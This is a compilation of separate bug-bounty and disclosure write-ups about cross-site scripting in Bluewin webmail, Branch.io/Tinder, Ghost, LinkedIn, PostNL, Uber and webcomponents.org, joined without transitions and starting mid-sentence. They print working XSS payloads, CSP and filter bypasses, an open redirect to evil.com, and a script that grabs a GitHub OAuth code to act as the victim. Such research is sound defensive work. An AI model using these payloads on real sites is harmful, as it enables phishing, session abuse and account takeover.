extremely popular web application, and we doubt it will be the last. Update - Now works on Chrome and link/meta and any other elements This technique now works in Chrome! It also works in link elements that means previously unexploitable XSS bugs in link elements where you only control attributes can be exploited using this technique. For example you might have a link element with a rel attribute on canonical, if you inject the accesskey attribute with an onclick event then you have XSS. <link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> Poc using link elements (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) Visit our Web Security Academy to learn more about cross-site scripting (XSS) XSS Back to all articles Related Research Stealing HttpOnly cookies with the cookie sandwich technique 22 January 2025 Stealing HttpOnly cookies with the cookie sandwich technique Bypassing WAFs with the phantom $Version cookie 04 December 2024 Bypassing WAFs with the phantom $Version cookie Concealing payloads in URL credentials 23 October 2024 Concealing payloads in URL credentials Exploiting XSS in hidden inputs and meta tags 11 July 2023 Exploiting XSS in hidden inputs and meta tags Burp Suite Web vulnerability scanner Burp Suite Editions Release Notes Vulnerabilities Cross-site scripting (XSS) SQL injection Cross-site request forgery XML external entity injection Directory traversal Server-side request forgery Customers Organizations Testers Developers Company About Careers Contact Legal Privacy Notice Insights Web Security Academy Blog Research Follow us © 2025 PortSwigger Ltd."}

While preparing the talk we had at BlackAlps (https://www.blackalps.ch) with Florian, he mentioned that an ex-colleague, Alexandre, had done a cool PoC for an XSS exploitation in the webmail at https://webmail.bluewin.ch. By chance, I had been starting to work on this system as well (and found an authorization bypass regarding email attachments… but this is another story ;-) ). Curious as I am, I contacted Alexandre and he shared his PoC with me, all credits for the idea and the first version goes to him! The whole idea is to use an XSS that can be forwarded via email to turn it into a worm that can replicate itself and spread on the mailbox of numerous users. This was possible in his version of the PoC thanks to an XSS that would get activated when the recipient of an email would reply and email or forward it. I thought it was very cool, but could use some improvement and I looked for another XSS to remove most of the user interaction. I was lucky enough to find one. The XSS is triggered in the attachments, where one can use special characters like < and > that won’t be properly escaped in the filename of the attachments. This happens when reading an email, the HTTP request is as follows: POST /cp/applink/mail/ReadMessage HTTP/1.1 Host: rich-v01.bluewin.ch User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://rich-v01.bluewin.ch/cp/ps/main/richui/main_swisscom X-CP-Application: RichUI 3.3.5.3.4 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 143 Cookie: [CUT BY COMPASS] Connection: close folderPath=Drafts&accountName=rireoubli%40bluewin.ch&detailLevel=hba&attachmentLevel=apt&drf=json&messageId=8&u=1480032388&d=bluewin.ch&t=82d87 As can be seen in the response below, the angle brackets are not escaped but the double-quotes are. The filename is later included into the DOM without more escaping, allowing for XSS. [CUT BY COMPASS] \"attachments\": [ { [CUT BY COMPASS] \"attributes\":[ { \"size\": \"24820\" }, { \"fileName\": \"grumpycat<img src=x onerror=alert(1)>.jpg\" }, { \"downloadUrl\": \"/applink/mail/Downloader?dhid=attachmentDownloader&messageId=8&accountName=rireoubli%40bluewin.ch&folderPath=Drafts&contentDisposition=attachment&attachmentIndex=0&contentSeed=d1281&pct=22d51\" }, { \"contentType\": \"IMAGE/JPEG; name=\\\"grumpycat<img src=x onerror=alert(1)>.jpg\\\"\" }, { \"mimeType\": \"IMAGE/JPEG\" } ] } [CUT BY COMPASS] However, there were some limitations. After some tries,I turned to twitter and got the help I needed: Armed with this, I could send the first version of the worm using the webmail. This would simply load a further script on my server and I could then easily trigger and modify the worm: From here, it was easy to update the PoC and the code would now do the following upon opening the email: Open a first popup “Here we go!” Open a second popup to thank the user and confirm that he wants to run arbitrary JavaScript in his session If the user accepted, open a third popup asking if the user agrees to mine some crypto coin while executing the PoC If the user accepted, open the bitcoin miner Get a list of all contacts and count the ones that end with @bluewin.ch, display 4 of them to the user and ask if we can send the worm to one of them Ask for a confirmation that the user really wants to send the payload to this email Confirming that the email was sent correctly and quitting All of this involves a lot of user interaction, but it would have been trivial (and even easier) to do it without asking the permission and let the worm propagate automatically. Here is a small video of the code in action: XSS worm in action Timeline: End of October 2018: First XSS Worm PoC 01.11.2018: Found second XSS and reported to Swisscom 02.11.2018: PoC code updated and forwarded to Swisscom 27.11.2018: Fix applied and verified 21.12.2018: Publication of this blog post As a last note, it was a pleasure to collaborate with Alexandre and the Swisscom team again, not forgetting all the ones on Twitter that took some time to help as well.

DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More Kristina Perunicic Published on October 09, 2018 Former Managing Editor Table of Contents Details: So, how did this bug affect more than Tinder? Our team of security researchers was researching dating apps client-side security, and one of the main focus targets was Tinder. After initial reconnaissance steps were done, a Tinder domain with multiple client-side security issues was found - meaning hackers could have access to users' profiles and details. Immediately after finding these vulnerabilities, we contacted Tinder via their responsible disclosure program and started working with them. We learned that the vulnerable endpoint isn’t owned by Tinder, but by branch.io, an attribution platform used by many big corporations around the globe. The Tinder security team helped us get in touch with them, and accordingly, they’ve put out a timely patch. Upon further investigation, it was discovered that numerous prominent websites, such as Shopify, Yelp, Western Union, and Imgur, were inadvertently exposing the vulnerable endpoint in their code and domains. Consequently, there is a potential risk for up to 685 million users. While the flaw has already been fixed, if you have recently used Tinder or any of the other affected sites, we recommend checking to make sure your account hasn't been compromised. It's a good idea to change your password ASAP. Details: DOM-based XSS vulnerability, also known as “type-0 XSS” is a class of cross-site scripting vulnerability that appears within the DOM. It is a type of attack wherein the attack payload is executed as a result of modifying the DOM environment in the victim’s browser, more so in a dynamic environment. In DOM-based XSS, the HTML source code and response of the attack will be exactly the same. This means the malicious payload cannot be found in the response, making it extremely difficult for browser-built in XSS mitigation features like Chrome’s XSS Auditor to perform. Can you spot the vulnerabilities? The fact that the vulnerability is DPM based and branch.io still isn't using CSP made these vulnerabilities easy to exploit in any browser we like. This meant that by modifying redirect strategy to a specially crafted payload to manipulate the DOM. 1. DOM XSS For example, our initial finding was the endpoint https://go.tinder.com/amp-iframe-redirect was prone to multiple vulnerabilities (scheme_redirect & redirect_strategy GET parameters control the div content). redirect_strategy is “INJECTIONA” and scheme_redirect is “INJECTIONB” from the code above. This meant that by modifying redirect_strategy to a dom-xss payload, it was possible to execute client-side code in the context of a Tinder domain in any browser: https://go.tinder.com/amp-iframe-redirect?scheme_redirect=http://google.com&redirect_strategy=1)%7B%0Aalert(1)%3B// will render in the DOM as: if (1){ alert(1); // && \"INJECTIONA\") { var parser = document.createElement('a'); parser.href = \"INJECTIONA\"; var protocol = parser.protocol.toLowerCase(); 2. validateProtocol() and validate() Bypass Also notice how validateProtocol() uses indexOf to check the schemes - the indexOf() method returns the position of the first occurrence of a specified value in a string. This method returns -1 if the value to search for never occurs. However, it can be tricked by using javascript://%0aalert(0)//good.com/https:// -- both the validate functions can be bypassed because indexOf will find “https://“ var parser = document.createElement('a'); parser.href = url; var protocol = parser.protocol.toLowerCase(); if ((‘javascript:', 'vbscript:', ‘data:').indexOf(protocol) < 0) { return url; } .... return null; if (['http:', 'https:'].indexOf(protocol) < 0) { window.top.location = validate(\"http://google.com\"); } So, how did this bug affect more than Tinder? go.tinder.com is an alias for custom.bnc.lt, a Branch.io resource. And many other companies have their alias pointing to it. To name a few websites affected by this vulnerability: RobinHood, Shopify, Canva, Yelp, Western Union, Letgo, Cuvva, imgur, Lookout, fair.com and more. Thanks to the fast response we got from Branch’s security team, this vulnerability has now been fixed for everyone’s domains.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS with PUT in Ghost Blog StackCrash Home About 19 October 2018 / XSS XSS with PUT in Ghost Blog Intoduction For my blog I have tried several content management systems and a while ago I decided to use Ghost for its simplicity and ease of use. Recently, I found XSS in the Ghost platform from at least version 1.24.9 and still in the latest version on GitHub . Most likely the XSS exists in much earlier versions as well. Note: this XSS does require administrator or owner roles and due to CORS/Same-Origin restrictions the likelyhood of exploitation outside of lab conditions is low. XSS in the API While auditing Ghost I discovered that there is an API call that is vulnerable to XSS. The particular API call is /ghost/api/v0.1/settings/ . The API call can be triggered from several of the settings tabs when an administrator or owner saves the settings. The API call sends a PUT request with JSON parameters. There are four parameters in the JSON that are vulnerable to XSS: logo, cover_image, ghost_head and ghost_foot. All four of the parameters will cause a XSS payload to be executed on every page of the website served by Ghost. The payload itself is very simple and only involves closing a script block before providing a new script block containing the XSS payload. The full settings JSON does not need to be sent with the request in order to exploit the XSS. Only sending the desired parameter and payload is sufficient. Note: the ghost_head and ghost_foot parameters are the same ones where in the administrator interface a user can place custom scripts. So they are meant to contain scripts so the XSS ends up being intended functionality for those two parameters. Rediscovery After finding the XSS I decided to do some more digging in Ghost past and found out I rediscovered an old XSS. VoidSec had previously discovered XSS in the same API call. It should be noted Ghost claimed in version 0.5.9 to have remediated this vulnerability and the original payload from VoidSec's report didn't work in the version I tested. Limitations Due to the API call being an authenticated PUT request and limitations of CORS exploiting the vulnerability an attacker would have to have to be able to access the session token for an administrator or owner. It is possible to bypass the CORS restrictions by sending the request through a proxy such as CORS Anywhere But modern browsers won't send the session token with the request since it doesn't comply with the same origin policy. Bypassing the same origin policy is the harder part. There are ways to by pass the same origin policy but thats for another blog post. Disclosure I initially disclosed to [email protected] and until I sent a third email about the impending public disclosure I never received a response. After the thrid email they responded referencing their now updated SECURITY.md . I did verify the XSS still exist as of version 2.2.0. Timeline 21 July 2018 - Initial reported to Ghost via email 30 July 2018 - Follow-up email sent to Ghost 4 October 2018 - Notified Ghost of upcoming public disclosure 5 October 2018 - Response from Ghost referencing updated SECURITY.md 19 October 2018 - Public disclosure after 90 days since initial report StackCrash Read more posts by this author.

I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background In my previous report we learned more about a special type of the persistent XSS attack; the unvalidated oEmbed attack . This attack allows us to inject our HTML and javascript code by manipulating the oEmbed functionality. oEmbed is an open format designed to allow embedding content from a website into another website. Almost all of the media rich platforms support the oEmbed standard. For example you can easily add a Vimeo video to your Wordpress blog by just pasting the link into the article. Wordpress will convert this link into HTML. This HTML loads the video player of Vimeo and starts the specific video. Medium for example will create a nice box with my twitter profile picture if I paste a link to my twitter profile into this post. This is oEmbed in action. As we learned previously, they were vulnerable and allowed unvalidated oEmbeds. Jonathan Bouman (@JonathanBouman) | Twitter The latest Tweets from Jonathan Bouman (@JonathanBouman). Medical Doctor (GP in training), Web Developer, Security… www.twitter.com Press enter or click to view image in full size oEmbed endpoint is specified by Twitter, Medium will use it for the embed Another way to embed visual rich content is by using the Open Graph Protocol . A website can add Open Graph Tags to their page in order to specify what type of content should be used for embeds. Press enter or click to view image in full size Wikipedia has an og:image meta tag, it defines the image that should be displayed if one embeds the article Most platforms check the urls for these specific oEmbed and Open Graph Tags before they embed the content. They do this in a specific order . After checking all the tags they will decide if and how the link got embedded. The big advantage of embeds is that readers don’t have to leave a blog to view the media rich content (e.g. video, images, presentations). Also for media platforms, like Vimeo and Youtube, it’s a great way to increase their exposure and views. Most of the platforms that allow you to embed external content have a whitelist of allowed domains; see Wordpress for example . You simply don’t want unvalidated HTML being injected into your platform. But what happens if this whitelist fails and we are able to inject our evil code into our target platform? We already proved oEmbed to be vulnerable , now let’s see if we can pull this trick again by manipulating Open Graph tags , let’s give it a try! Pick our target Who should we pick today? You say LinkedIn? Good choice! LinkedIn is one of my favorite places to go whenever I try to stay in touch with fellow researchers. Furthermore it’s a place where plenty of CEO/CTO/CTTO/CNYANCATO’s hang around. So whenever I got stuck in reporting bugs (e.g. non responsonding support desks), I try to get in touch with the people responsible. Sending a quick LinkedIn direct message is often enough; ‘Hey, can you take a look at ticket 4242, your site is vulnerable. Support is sleeping.’ Last but not least; LinkedIn got a nice responsible disclosure and they even have a (private) bug bounty program . So let’s try to get an invite for this bug bounty program by filing our first report with them! Identifying targets Blogs, that’s what we think of if we look for places that allow us to embed external content; say hello to LinkedIn Articles . You can open this part of LinkedIn by visiting your news feed and press the Write an Article button. Press enter or click to view image in full size Write an article We get a nice and clean editor that allows us to write our first article, consisting of a headline and some content. Next to our cursor there is a little icon that allows us to ‘ Add images or video for visual impact.’ Press enter or click to view image in full size The blog editor If we press this little icon, we can pick the Links button and add visual rich content to our blog. Press enter or click to view image in full size The embed wizard, magic! Embed Requests Time to fire up Burp Suite and inspect our network traffic, what happens after we fill in the URL? Press enter or click to view image in full size Link got converted to HTML code that embeds the Youtube player As we can see LinkedIn converts our url into HTML code that we are allowed to embed. The response is URL encoded, the URL decoded version is: {“embedIframe”:”<iframe src=\\” https://www.linkedin.com/pulse/api/edit/embed?embed={ \"request\":{\"originalUrl\":\" https://www.youtube.com/watch?v=9hWgA7qjK2c \",\"finalUrl\":\" https://www.youtube.com/watch?v=9hWgA7qjK2c \"},\"images\":[{\"width\":480,\"url\":\" https://i.ytimg.com/vi/9hWgA7qjK2c/hqdefault.jpg \",\"height\":360},{\"width\":1920,\"url\":\" https://i.ytimg.com/vi/9hWgA7qjK2c/maxresdefault.jpg \",\"height\":1080}],\"data\":{\"com.linkedin.treasury.Video\":{\"width\":480,\"html\":\"<iframe scrolling=\\”no\\” allowfullscreen src=\\”//media.licdn.com/embeds/media.html?src= https://www.youtube.com/embed/9hWgA7qjK2c?feature=oembed&amp;url=https://www.youtube.com/watch?v=9hWgA7qjK2c&amp;type=text/html&amp;schema=youtube\\ \" width=\\”480\\” frameborder=\\”0\\” class=\\”embedly-embed\\” height=\\”270\\” />”,”height”:270}},”provider”:{“display”:”YouTube”,”name”:”YouTube”,”url”:” https://www.youtube.com/ \"},\"author\":{\"name\":\"321 Relaxing — Meditation Relax Clips”},”description”:{“localized”:{“en_US”:”Rain HD video and forest, relaxing rain sounds and forest sounds for sleeping meditation. Nature sounds relaxation. Rainforest sounds: https://www.youtube.co ...\"}},\"title\":{\"localized\":{\"en_US\":\"Rain Sounds and Forest Sounds — Relaxing Sleep”}},”type”:”video”}&signature=AcdfNDjBXZOjo2vdz4EOixtGBrlx\\”></iframe>”,”universal”:true} The editor parses this iframe into our article and this results in three iframes being nested in each other before the video player shows up. There we go; we just embedded a Youtube video with relaxing rain sounds . Press enter or click to view image in full size Nested iframes, it takes three iframes before we can listen to jungle sounds. This means that even if we are able to inject our own evil HTML we won’t have access to the LinkedIn domain; we are isolated in an iframe . We can’t access any LinkedIn cookies and we are not able to manipulate the HTML outside of the iframe. However the impact can still be big if we can inject a fake LinkedIn login screen and steal passwords of visitors . LinkedIn embeds the content without any visual hints that something is an embed, just clean borderless boxes. So it’s not possible for visitors to distinguish it from a real login screen. A perfect phishing login First we need to design the phishing login screen. Since we want to show the impact in a way that also non-tech people understand the severity. A simple javascript alert box is often not sufficient. A good tool to duplicate HTML elements of other websites is SnappySnippet. This Chrome extension lets you select an element in a website and copy paste it as plain HTML and CSS. Press enter or click to view image in full size SnappySnippet We paste the code from SnappySnippet into a new HTML file, tune it a little bit, and add some javascript at the end so it captures the email and password. If one submits the form we want to display the login details in a javascript alert box as a proof of concept. Press enter or click to view image in full size Javascript alert of the login details Let’s upload this fake login html file to our own server and try to embed it in our LinkedIn article. Just to see what happens if we link to it without any oEmbed or Open Graph tags. Fake login embed without any tags, it does not work As we can see it falls back to an ‘universal-embed-wrapper’ that just displays our URL with a little gray border around it. Exploiting the Open Graph If we take a close look at the Open Graph Protocol specs we discover that there is a tag named og:video. It defines how a video player should be embedded. Press enter or click to view image in full size Vimeo example of Open Graph video meta tags What if we create a HTML file with the og:video tags that loads our fake login instead of the video player? Press enter or click to view image in full size The document we are trying to embed, it loads the fake login as a video player Press enter or click to view image in full size Our fake login loads, LinkedIn thinks it’s a genuine video player Tada! We’ve got our fake login embedded inside a LinkedIn article. Let’s name the article ‘Oops, something went wrong!’ and we’re ready to go. We are now able to spear phish other users by sharing them a private link to the draft of this article. Or we can just publish it on the LinkedIn network and see what happens. We’ve got everything ready now, time to file a report with LinkedIn security. Press enter or click to view image in full size Proof of concept Conclusion We found a way to create a perfect phishing website on the LinkedIn.com domain. We used the Open Graph Video meta tag in order to inject our phishing login as a video player in an LinkedIn article. This is a variation of the persistent XSS attack. Impact of this attack - Perfect situation for (spear) phishing - We may auto redirect users to another page after they have entered their credentials, so it doesn’t look suspicious (by using top.location.href ) - Attack visitors by embedding http://beefproject.com/ - Allows an attacker to perform clickjack attacks Do I forget anything? Leave a comment! Solutions that prevent this attack - Never trust Open Graph Tags from strangers, use a whitelist for embeds - Don’t allow iframes to break out Rewards None. Timeline 01–07–2018 Discovered and reported bug by email 01–07–2018 LinkedIn informed me they received the report 20–07–2018 Requested update 24–07–2018 LinkedIn replied that fix is deployed, I replied all my test accounts are blocked by LinkedIn, unable to confirm fix, requested to unblock the test accounts, no reply 02–08–2018 Used my personal account for testing, confirmed the fix, requested LinkedIn if bug is eligible for any rewards or invite into private program, requested to unblock my test account. 04–08–2018 Reply from LinkedIn that I’m on their review list for an invite to the private program. No answer on question if bug is eligible for reward. All accounts still blocked, so not able to test for any new bugs (no new accounts due to phone number verification).

Vulnerable Endpoint :- http://realestate.postnl.nl/?Lang= To test a normal Reflected XSS I Input “><xsstest> in the Lang parameter and in source it was reflected properly inside META tag like below :- <meta name=\"language\" content=\"\"><xsstest>\" /> Looks simple right ? Then wait a little :’) . Then I Inputted “><img src=x> and I got :- Press enter or click to view image in full size Surprise you nigga 🥳🥳🥳 I tried with many HTML tags and I got 2 points here :- Any Valid HTML tag is not allowed . I can created any attributes here . So I googled for meta tag attributes and got :- Press enter or click to view image in full size looks interesting 🤔🤔🤔 The http-equiv attribute took my attention . Now I again google more about it and learned that :- META tag has the http-equiv directive. This directive allows you to define the equivalent of an HTTP header in the HTML code . The http-equiv directive can take a value of refresh , which can be used to redirect a user to another page. Then I input 0;http://evil.com\"HTTP-EQUIV=\"refresh\" and response was :- <meta name=\"language\" content=\"0;http://evil.com\"HTTP-EQUIV=\"refresh\"\" /> And I got redirected to evil.com . So I have open redirection now . Now we can try for Data URI XSS . So I input :- 0;javascript:alert(1)\"HTTP-EQUIV=\"refresh\" and response was :- Press enter or click to view image in full size This was again Triaged for the keyword javascript used in payload . So I used Base64 encoded payload :- 0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg==\"HTTP-EQUIV=\"refresh\" and response source was :- <meta name=\"language\" content=\"0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg==\"HTTP-EQUIV=\"refresh\"\" /> And now when I visit http://realestate.postnl.nl/?Lang=0%3Bdata%3Atext%2fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg%3D%3D%22HTTP-EQUIV%3D%22refresh%22 I got XSS popup . Press enter or click to view image in full size I reported it to their Zerocopter report form . Then they deployed a Fix by blacklisting the data:text/html;base64 keyword like they have blacklisted JavaScript keyword but still I can do Open Redirect when a user visits :- http://realestate.postnl.nl/?Lang=0%3Bhttp%3A%2f%2fevil.com%22HTTP-EQUIV%3D%22refresh%22 Press enter or click to view image in full size Looks cool 🙄🙄🙄 They again Fixed the issue and listed My name on their Hall Of Fame page & also offered to send some goodies 😍😍😍 .

Then I thought about which characters I could use. So, I went to: https://example.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=”’<>/(); Press enter or click to view image in full size Then I saw I could not use </script><img src=v onerror=alert(1)> for get xss. I thought I will not bypass it, but maybe I can add javascript. So, I can get xss. After researching javascript for a while, I created the required block of code: ); alert(document.domain); if (1 When I go to https://example.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=); alert(document.domain); if (1 , I saw the xss alert ;) Press enter or click to view image in full size Some popular companies are using this script.

The website [redacted.com] is protected by Cloudflare WAF and hence many payloads are filtered. But the website is implemented in an extremely bad way that even Cloudflare can’t protect it. Just a few days before the day I found this bug, I was telling my colleagues “don’t rely on firewalls / security products too much” during an internal presentation. Now I have a real example to talk about. LOL. Summary When I triggered an error on the login page, a parameter called Message is reflected in the body of the html AND a pop-up box (i.e. the value of “Message” is inserted in javascript, right inside alert(“[value_here]”)) without filtering. So I was able to insert anything I like in the script. Payload: This is an outdated page. You will now be redirected to our new page\"); window.location=\"https://google.com\"// Press enter or click to view image in full size So we can spoof the users that they are going to an updated webpage and login again. (Redirecting to google for demonstration here) How did I find it In fact I was checking their register and sign in function and attempting to find some application flaws. I registered an account using email a@a.com without verifying it and tried to signup with the same email again. Then an error message is popped up: Press enter or click to view image in full size And I found that the URL became https://redacted.com/Secure/Login.aspx?UserID=a@a.com&ReturnUrl=&Message=The E-Mail Address entered (a@a.com) is already on file. If this is your correct e-mail address, you may sign in as an existing customer. Exactly the same of that in the pop-up box and the text shown on the top: Press enter or click to view image in full size So the message maybe reflected in the body of the HTML. I tried the straight forward <script>alert(1)</script> payload. Then I got this: Press enter or click to view image in full size Oops. Cloudflare. But that was in my expectation 🙂 . The payload is for dummies. I noticed that the message is inserted in javascript directly: Press enter or click to view image in full size So what we can do is closing the double quote and the parentheses like alert(\" something_here\");evil_script_here// \") Then we can do anything we want. Good firewalls can’t save bad code. That’s it. Thanks for reading.

First of all,I’m not a security researcher/security engineer or anything similar,I’m just a guy who learns new things and who tries to improve himself every day.Due to some school related reasons I couldn’t write any of my findings,but since I’m in some kind of resting period and since I believe “Sharing is caring” it’s time to write about them ,I will publish a write-up every week ! My journey started 2 years ago with Uber.But,while I’m not a new person in this bug bounties,I’m definitely a newbie,so maybe my blogs might not be very interesting for experts.Anyway,let’s come to the point. The Story I was looking for some open redirect vulnerabilities on subdomains of Uber,I know they don’t see “Open Redirect” as a vulnerability but I thought “Why not chain it with other vulnerabilities ? Maybe it could lead to account takeover or something ? “ My thoughts triggered my ambition.When I was looking for endpoints on partners.uber.com this URL got my interest https://partners.uber.com/carrier-discounts/att/redirect?href=http://www.wireless.att.com/ I saw this URL in a forum then I found a similar one with a help of Google dorks.Was it vulnerable for open redirect ? Yes ! Then,there was one job to do,find another vulnerability in login section to combine it.I looked for it,really,hours and hours but I wasn’t lucky at all.So there is no need to report it, they say : “Open redirects. 99% of open redirects have low security impact. For the rare cases where the impact is higher, e.g., stealing oauth tokens, we do still want to hear about them.” After one week I checked this URL and it wasn’t working,as now,whatever you put to http parameter,it will redirect you to https://www.wireless.att.com So they fixed it,Did they realize it by themselves or somebody reported it ? I don’t know and I don’t care.But,you know the feeling you are starting with a goal of something big,in the end all you have is a tired, frustrated person.After this,I was upset but triggered second time to find something,and now the time is coming to trigger XSS,not myself ! The Vulnerability If I would ask “ What are the most known URL’s,links of Uber” to you,probably your answer will be invitation links.You can see these links everywhere,In a forum post,in Twitter,in Facebook,in Instagram… There are different URL’s for invitation links : https://www.uber.com/a/join?exp_hvp=1&invite_code=bq6ew1w9ue I checked this one for XSS but nothing came up :( https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue What about this one ? It’s the same invite code and if you click you can see that it redirects to other URL,but why not check for other parameters ? With a help of basic dorks I looked for everything under this subdomain. site:partners.uber.com And with this dork you can reach out to a very big list of invite links.My point was to find another parameter and I found one ! https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue&m=ANNIVERSARY&v=1 Looks cool,but where is the XSS ? The “v” parameter shows how many years he/she worked as Uber driver,it’s like a celebration of anniversary.As soon as I found this parameter,tried to inject some XSS payload but there was no XSS pop-up,suddenly I checked the source code. Original Code : content=”static/images/milestones/anniversary/anniversary_1.png” /> After my payload content=”static/images/milestones/anniversary/anniversary_1 “><img src=x onerror=alert(document.cookie)>.png” /> As you can see,there was no filtering but in the meantime there was no XSS pop-up,it reminded me Content Security Policy.What is CSP ? As Netsparker’s blog says : “ The Content Security Policy (CSP) standard is a way to selectively specify which content should be loaded in web applications. This can be done by whitelisting specific origins, using nonces or hashes”. So if there will be any whitelisted domains we can try to use them against CSP.Let’s check Uber’s CSP header for partners.uber.com.It’s very long,I will add only the part after “script-src” script-src ‘self’ ‘unsafe-inline’ ‘nonce-9f4b94bf-a195–4d8c-b474–879ae6d1d471’ ‘self’ ‘unsafe-inline’ https://pullo.uberinternal.com https://apis.google.com https://www.google.com https://d1a3f4spazzrp4.cloudfront.net https://*.uber.com https://rules.quantcount.com https://www.google-analytics.com https://ssl.google-analytics.com https://d3i4yxtzktqr9n.cloudfront.net https://d1a3f4spazzrp4.cloudfront.net; Firstly,I checked for rules.quantcount.com and looked for json endpoints but there’s nothing much about it.And there’s a huge advantage for us because they whitelisted *uber.com so if we can find any JSON endpoint with callback or anything similar,then we are able to execute XSS.In the meantime,I was reading a blog named “DOM XSS — auth.uber.com”,the guy “ stamone ” did very good job,and you should read that ! http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html Check out his write-up,he also bypassed CSP ,how ? In his report CSP was allowing him to get something from *.marketo.com So he used basic dorks and found out a callback parameter and works great as you can see Press enter or click to view image in full size After reading this write-up, I went to Virustotal and checked Uber’s subdomains,one of them got me ! What,mkto ? Is “mkto” the short name for marketo ?! Press enter or click to view image in full size YESS! It was. Go to mkto.uber.com,it will redirect you to “ https://app-ab19.marketo.com/index.php ”. It is definitely marketo.So now it’s time to use it against CSP.Using a basic payload I created this link and checked,it worked out. https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue&m=ANNIVERSARY&v=1 \"><script src=” https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); \"></script> Press enter or click to view image in full size This time I triggered XSS ! Timeline [03–08–2018] Reported to Uber [07–08–2018] Changed the status to “Triaged” [22–08–2018] Additional information sent and asked about process [23–08–2018] Reply from Uber:”Thanks @mefkan ! We have passed this information along to the internal team.” [27–08–2018] Vulnerability fixed [30–08–2018] Bounty awarded $2,000 [03–04–2018] Limited disclosure on Hackerone Takeaways 1-Don’t say “This a very known URL,no need to check it for vulnerabilities”.I can guarentee you that you missed a lot of bugs. 2-Always check out for others write-ups,particularly if you’re looking for something special or something detailed.Give your hours for only reading and understanding the logic behind. 3-Never give up,try your best,do your best,you will get what you want at the end. The End It was my first write-up folks and as I said I’ll publish another write-up every week.So don’t forget to follow me on Twitter,feel free to share your thoughts or questions with me,and I hope this helps to people like me to improve themselves.

Create a Polymer element and publish it to github 2. Set the repo homepage URL to: javascript:alert(document.domain) 3. Publish it via https://www.webcomponents.org/publish 4. Go to the element’s webcomponents.org page and click the homepage link What you can do with this XSS: If the user has authenticated using Github on webcomponents.org before, it’s possible to get the Github auth code and use it to star any public Github repo behalf of the user. It would work like this: Create an iframe with the GitHub auth URL. If the user is already authenticated, it redirects us to webcomponents.org . It will have the auth code in the url as ?code=123 (and we can access the iframe because it’s same origin). Use the code to post a request to webcomponents.org ‘s API to star any GitHub repository using the user’s account Here’s an example: // create an iframe with github authorization url // that redirects us back to webcomponents.org var iframe; iframe = document.createElement('iframe'); iframe.src = 'https://github.com/login/oauth/authorize?client_id=54fc42e15038794b7011&scope=public_repo&redirect_uri=https://www.webcomponents.org/element/ThomasOrlita/test2'; iframe.style.display = 'none'; document.body.appendChild(iframe); // just wait some time until it's loaded and redirected setTimeout(() => { console.log(iframe.contentWindow.location.href); // get the url that contains the authorization code from the iframe var url = new URL(iframe.contentWindow.location.href); var code = url.searchParams.get(\"code\"); // the github repo we want to star var repo_to_star = 'kelseyhightower/nocode'; // make a post request using the code fetch('/api/star/' + repo_to_star + '?code=' + code, { method: 'POST' }) }, 5000); Timeline 2018-08-12 Vulnerability reported 2018-08-17 Added more info 2018-08-20 Nice catch 2018-08-22 Fixed 2018-08-29 Reward issued Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: Angular XSS vulnerability on McDonalds.com Next Article Reflected XSS in Google Code Jam Related Articles Bypassing Firebase authorization to create custom app.goo.gl subdomains by Thomas Orlita in Vulnerabilities How to use Google’s CSP Evaluator to bypass CSP by Thomas Orlita in Vulnerabilities Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities 5 Different Vulnerabilities in Google’s Threadit by Thomas Orlita in Vulnerabilities Leave a Reply Cancel reply You must be logged in to post a comment.

I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background As we learned from previous reports, XSS attacks can have a high impact ; you are able to steal cookies , attack the browser of a visitor or use it to phish for login credentials . Today we will learn more about a reflected XSS attack in Adobe Experience Manager (AEM) that bypasses the Web Application Firewall (WAF), it results in a fully working phishing login. Philips As always, we need to find a proper target for our attack. What about Philips ? This year they won an award for being “The most reputable company in the Netherlands” . Customers trust their brand and this makes them a high profile target for phishers. Press enter or click to view image in full size Winning the award for the eleventh year in a row Furthermore they’ve got a proper Responsible Disclosure , so we’re safe to help them. It’s time to claim our Hall of Honors mention! Reconnaissance , finding attack vectors Where do we start if we want to find a XSS bug? No strict rules. I always start with Aquatone in order to discover interesting subdomains, see this report for details. After that I start Burp Suite , see this report , and I start looking around for bugs! Press enter or click to view image in full size Add philips to the target scope, use .* as a joker to capture every philips hostname Press enter or click to view image in full size Example of a site map, you may send a request to the repeater to test it for XSS While clicking around the website, Burp Suite captures all the requests and responses. Burp Suite has a nice feature that creates a site map out of this data. This gives us a quick insight in how the website is structured, it also allows us to easily repeat specific requests and check if a page is vulnerable to XSS attacks. The principle of XSS is that we manipulate input variables (i.e. the website url or form fields) so we are able to inject our own HTML code into our targets website. Due to that we are able to inject some javascript code that changes the layout; for example into a phishing login. The URL is an important attack vector . If parts of the URL got reflected in the page response, without being escaped , we have a potential reflected XSS bug. Another important thing is to check if we are able to add HTML data to the website that persists in some database; a stored XSS. Press enter or click to view image in full size OWASP XSS Prevention cheat sheet, Rule #1: escape everything. Long story short, after a few hours of trying I did not find any 